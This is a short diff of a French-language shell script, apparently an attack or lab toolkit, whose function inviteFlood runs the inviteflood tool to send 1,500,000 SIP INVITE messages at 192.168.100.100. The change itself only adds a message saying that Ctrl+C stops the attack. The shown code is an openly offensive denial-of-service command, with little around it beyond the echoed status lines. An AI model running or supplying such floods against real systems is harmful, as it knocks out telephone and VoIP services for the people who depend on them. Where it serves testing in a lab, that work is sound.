@@ -36,6 +36,8 @@ done
 
 inviteFlood () {
 	echo "Lancement de l'attaque ..."
+	echo "Appuyer sur CTRL + C pour stopper l'attaque avant la fin."
+	
 	inviteflood eth0 user 192.168.100.100 192.168.100.100 1500000
 	echo "Fin de l'attaque "
 }
